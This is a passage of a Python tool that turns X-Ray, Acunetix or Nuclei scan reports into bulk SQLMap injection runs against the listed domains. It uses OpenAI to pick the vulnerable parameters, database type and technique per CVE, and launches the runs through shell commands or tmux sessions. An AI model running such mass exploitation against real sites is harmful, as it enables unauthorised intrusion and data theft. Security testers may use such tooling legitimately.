            subprocess.run([multiplexer, 'new-session', '-d', '-s', session_name], check=True)
            
            for idx, cmd in enumerate(commands):
                if idx > 0:
                    subprocess.run([multiplexer, 'new-window', '-t', f'{session_name}:{idx}'], check=True)
                
                subprocess.run([
                    multiplexer, 'send-keys', '-t', f'{session_name}:{idx}',
                    cmd, 'Enter'
                ], check=True)
            
            ConsoleRenderer.success(f"Created {multiplexer} session: {session_name}")
            ConsoleRenderer.status(f"Attach with: {multiplexer} attach -t {session_name}", 'gray')
            return True
            
        except Exception as e:
            ConsoleRenderer.warning(f"Failed to create session: {e}")
            return False
    
    @staticmethod
    def run_direct(domain: str, commands: List[str], output_dir: Path):
        """Run SQLMap commands directly in background"""
        domain_clean = domain.replace('.', '_').replace(':', '_')
        log_dir = output_dir / domain_clean / 'logs'
        log_dir.mkdir(parents=True, exist_ok=True)
        
        processes = []
        for idx, cmd in enumerate(commands):
            log_file = log_dir / f"sqlmap_{idx+1}.log"
            
            with open(log_file, 'w') as f:
                f.write(f"Command: {cmd}\n")
                f.write(f"Started: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write("="*80 + "\n\n")
            
            try:
                proc = subprocess.Popen(
                    cmd,
                    shell=True,
                    stdout=open(log_file, 'a'),
                    stderr=subprocess.STDOUT
                )
                processes.append((proc, log_file, idx+1))
                ConsoleRenderer.success(f"Started process {idx+1}/{len(commands)} (PID: {proc.pid})")
                
            except Exception as e:
                ConsoleRenderer.error(f"Failed to start: {e}")
        
        return processes


# ============================================================================
# MAIN
# ============================================================================
def main():
    if '-h' in sys.argv or '--help' in sys.argv:
        ConsoleRenderer.print_banner()
    
    parser = argparse.ArgumentParser(
        description='Intelligent SQLMap automation with AI-powered optimization'
    )
    parser.add_argument('-f', '--file', help='Single JSON/CSV report file (X-Ray JSON or Acunetix CSV)')
    parser.add_argument('-d', '--directory', help='Directory with JSON/CSV reports')
    parser.add_argument('-n', '--nuclei', nargs='?', const='auto', default=None,
                        help='Nuclei SQLi output file or directory (auto-detect if not specified)')
    parser.add_argument('--max-targets', type=int, default=None,
                        help='Maximum number of targets to process in Nuclei mode (default: all)')
    parser.add_argument('-o', '--output', default='smx_out',
                        help='Output directory for request files and SQLMap results (default: smx_out)')
    parser.add_argument('-p', '--max-params', type=int, default=3,
                        help='Maximum number of parameters per domain (default: 3)')
    parser.add_argument('-b', '--byobu', nargs='?', const='xtest', default=None, metavar='PREFIX',
                        help='Use byobu/tmux sessions (optional: session prefix, default: xtest)')
    
    args = parser.parse_args()
    
    # Auto-detect mode if no explicit args
    if not args.file and not args.directory and not args.nuclei:
        # Look for files in current directory
        cwd = Path('.')
        json_files = list(cwd.glob('*.json'))
        csv_files = list(cwd.glob('*.csv'))
        txt_files = list(cwd.glob('*.txt'))
        
        if json_files or csv_files:
            args.directory = '.'
            ConsoleRenderer.status("Auto-detected JSON/CSV files in current directory", 'gray')
        elif txt_files:
            args.nuclei = 'auto'
            ConsoleRenderer.status("Auto-detected TXT files in current directory (Nuclei mode)", 'gray')
        else:
            parser.error('No report files found. Use --file, --directory, or --nuclei')
    
    ConsoleRenderer.print_banner()
    
    # Check API key
    if not OPENAI_API_KEY:
        ConsoleRenderer.error("OPENAI_API_KEY not found in environment")
        return 1
    
    output_dir = Path(args.output)
    output_dir.mkdir(parents=True, exist_ok=True)
    
    sql_output_dir = output_dir / 'sql_out'
    sql_output_dir.mkdir(parents=True, exist_ok=True)
    
    ai_analyzer = AIAnalyzer(OPENAI_API_KEY)
    ConsoleRenderer.success("AI analyzer initialized")
    
    # =========================================================================
    # NUCLEI MODE - Sequential with AI web search
    # =========================================================================
    if args.nuclei:
        ConsoleRenderer.status("\n=== NUCLEI SQLi MODE ===", 'yellow')
        ConsoleRenderer.status("AI will search web for CVE information", 'gray')
        
        # Handle auto-detect or explicit path
        if args.nuclei == 'auto':
            # Find all .txt files in current directory
            cwd = Path('.')
            txt_files = sorted(cwd.glob('*.txt'))
            if not txt_files:
                ConsoleRenderer.error("No .txt files found in current directory")
                return 1
            ConsoleRenderer.status(f"Found {len(txt_files)} .txt file(s)", 'gray')
            
            # Parse all txt files
            vulnerabilities = []
            for txt_file in txt_files:
                vulns = NucleiParser.parse_nuclei_file(txt_file)
                if vulns:
                    ConsoleRenderer.status(f"  {txt_file.name}: {len(vulns)} target(s)", 'gray')
                    vulnerabilities.extend(vulns)
        else:
            nuclei_path = Path(args.nuclei)
            if nuclei_path.is_dir():
                # Parse all .txt files in directory
                txt_files = sorted(nuclei_path.glob('*.txt'))
                if not txt_files:
                    ConsoleRenderer.error(f"No .txt files found in {nuclei_path}")
                    return 1
                ConsoleRenderer.status(f"Found {len(txt_files)} .txt file(s) in {nuclei_path}", 'gray')
                
                vulnerabilities = []
                for txt_file in txt_files:
                    vulns = NucleiParser.parse_nuclei_file(txt_file)
                    if vulns:
                        ConsoleRenderer.status(f"  {txt_file.name}: {len(vulns)} target(s)", 'gray')
                        vulnerabilities.extend(vulns)
            else:
                # Single file
                vulnerabilities = NucleiParser.parse_nuclei_file(nuclei_path)
        
        if not vulnerabilities:
            ConsoleRenderer.error("No SQLi targets found in Nuclei file")
            return 1
        
        ConsoleRenderer.status(f"Found {len(vulnerabilities)} unique domains", 'gray')
        
        # Apply --max-targets limit if specified
        if args.max_targets and len(vulnerabilities) > args.max_targets:
            vulnerabilities = vulnerabilities[:args.max_targets]
            ConsoleRenderer.status(f"Limited to {args.max_targets} targets (use --max-targets to change)", 'yellow')
        
        # Show CVE breakdown
        cve_counts = {}
        for v in vulnerabilities:
            cve = v['cve']
            cve_counts[cve] = cve_counts.get(cve, 0) + 1
        
        ConsoleRenderer.status(f"\nCVE breakdown:", 'gray')
        for cve, count in sorted(cve_counts.items(), key=lambda x: -x[1]):
            ConsoleRenderer.status(f"  {cve}: {count} target(s)", 'white')
        
        # Process each target with AI web search
        commands_to_run = []
        
        for vuln in vulnerabilities:
            cve = vuln['cve']
            url = vuln['url']
            domain = vuln['domain']
            
            ConsoleRenderer.status(f"\n--- {domain} ---", 'yellow')
            ConsoleRenderer.status(f"CVE: {cve}", 'gray')
            
            # Use AI with web search to analyze CVE
            ai_config = ai_analyzer.search_cve_info(cve, url, vuln)
            
            if not ai_config.get('is_sqli', True):
                ConsoleRenderer.warning(f"AI says {cve} is NOT SQLi: {ai_config.get('notes', '')}")
                continue
            
            ConsoleRenderer.success(f"AI config: param={ai_config.get('vulnerable_param')}, "
                                   f"dbms={ai_config.get('dbms')}, "
                                   f"technique={ai_config.get('technique')}")
            if ai_config.get('notes'):
                ConsoleRenderer.status(f"  Notes: {ai_config['notes']}", 'gray')
            
            # Build sqlmap command
            cmd = SQLMapRunner.build_nuclei_command(vuln, ai_config, str(sql_output_dir))
            commands_to_run.append((cmd, vuln))
        
        if not commands_to_run:
            ConsoleRenderer.error("No valid SQLi targets to scan")
            return 1
        
        # Group commands by domain for byobu sessions
        commands_by_domain = {}
        for cmd, vuln in commands_to_run:
            domain = vuln.get('domain', 'unknown')
            if domain not in commands_by_domain:
                commands_by_domain[domain] = []
            commands_by_domain[domain].append(cmd)
        
        ConsoleRenderer.status(f"\n=== LAUNCHING SQLMAP ===", 'yellow')
        ConsoleRenderer.status(f"Total targets: {len(commands_to_run)} ({len(commands_by_domain)} domains)", 'gray')
        
        use_byobu = args.byobu
        all_processes = []
        
        for domain, cmds in commands_by_domain.items():
            ConsoleRenderer.status(f"Domain: {domain} ({len(cmds)} command(s))", 'gray')
            
            if use_byobu:
                success = SQLMapRunner.create_byobu_session(domain, cmds, prefix=use_byobu)
                if not success:
                    ConsoleRenderer.warning("Byobu failed, falling back to direct execution...")
                    processes = SQLMapRunner.run_direct(domain, cmds, output_dir)
                    all_processes.extend(processes)
            else:
                processes = SQLMapRunner.run_direct(domain, cmds, output_dir)
                all_processes.extend(processes)
        
        if all_processes:
            ConsoleRenderer.status(f"\n=== RUNNING PROCESSES ===", 'yellow')
            ConsoleRenderer.status(f"Total: {len(all_processes)}", 'gray')
            ConsoleRenderer.status(f"Logs: {output_dir}/<domain>/logs/", 'gray')
        
        ConsoleRenderer.success("\nProcessing complete!")
        return 0
    
    # =========================================================================
    # X-RAY / ACUNETIX MODE (original functionality)
    # =========================================================================
    report_files = []
    if args.file:
        report_files = [Path(args.file)]
    elif args.directory:
        dir_path = Path(args.directory)
        report_files = list(dir_path.glob('*.json')) + list(dir_path.glob('*.csv'))
    
    if not report_files:
        ConsoleRenderer.error("No JSON or CSV files found")
        return 1
    
    ConsoleRenderer.status(f"Found {len(report_files)} report file(s)", 'gray')
    
    domain_param_count = {}
    all_processes = []
    use_byobu = args.byobu
    
    for report_file in report_files:
        ConsoleRenderer.status(f"Processing: {report_file}", 'yellow')
        
        file_commands_by_domain = {}
        
        try:
            # Detect file type
            if str(report_file).endswith('.csv'):
                vulnerabilities = AcunetixCSVParser.parse_csv_file(report_file)
                is_acunetix = True
            else:
                vulnerabilities = VulnerabilityParser.parse_json_report(str(report_file))
                is_acunetix = False
            
            for vuln in vulnerabilities:
                if is_acunetix:
                    domain = vuln.get('domain', 'unknown')
                    param_name = vuln.get('parameter', '')
                else:
                    target_url = vuln.get('target', {}).get('url', '')
                    domain = urllib.parse.urlparse(target_url).netloc if target_url else 'unknown'
                    param_name = VulnerabilityParser.extract_parameter_name(vuln)
                
                # Check max params limit
                if args.max_params and param_name:
                    if domain not in domain_param_count:
                        domain_param_count[domain] = set()
                    
                    if len(domain_param_count[domain]) >= args.max_params and param_name not in domain_param_count[domain]:
                        continue
                    domain_param_count[domain].add(param_name)
                
                # Create request file
                if is_acunetix:
                    result = AcunetixCSVParser.create_request_file_with_ai(vuln, output_dir, OPENAI_API_KEY)
                else:
                    result = VulnerabilityParser.create_request_file_with_ai(vuln, output_dir, OPENAI_API_KEY)
                
                if not result:
                    continue
                
                request_file, parameter = result
                ConsoleRenderer.success(f"Created request file: {request_file}")
                
                # Analyze with AI
                if is_acunetix:
                    ai_config = ai_analyzer.analyze_acunetix_vulnerability(vuln)
                else:
                    ai_config = ai_analyzer.analyze_vulnerability(vuln)
                
                cmd = SQLMapRunner.build_command(request_file, parameter, ai_config, str(sql_output_dir))
                
                if domain not in file_commands_by_domain:
                    file_commands_by_domain[domain] = []
                file_commands_by_domain[domain].append(cmd)
            
            # Launch SQLMap
            if file_commands_by_domain:
                ConsoleRenderer.status(f"\n=== LAUNCHING SQLMAP ===", 'yellow')
                
                for domain, cmds in file_commands_by_domain.items():
                    ConsoleRenderer.status(f"Domain: {domain} ({len(cmds)} commands)", 'gray')
                    
                    if use_byobu:
                        cmds_limited = cmds[:args.max_params] if args.max_params else cmds
                        success = SQLMapRunner.create_byobu_session(domain, cmds_limited, prefix=use_byobu)
                        if not success:
                            processes = SQLMapRunner.run_direct(domain, cmds, output_dir)
                            all_processes.extend(processes)
                    else:
                        processes = SQLMapRunner.run_direct(domain, cmds, output_dir)
                        all_processes.extend(processes)
                
        except Exception as e:
            ConsoleRenderer.warning(f"Skipped {report_file.name}: {e}")
    
    if all_processes:
        ConsoleRenderer.status(f"\n=== RUNNING PROCESSES ===", 'yellow')
        ConsoleRenderer.status(f"Total: {len(all_processes)}", 'gray')
        ConsoleRenderer.status(f"Logs: {output_dir}/<domain>/logs/", 'gray')
    
    ConsoleRenderer.success("\nProcessing complete!")
    return 0


if __name__ == '__main__':
    sys.exit(main())
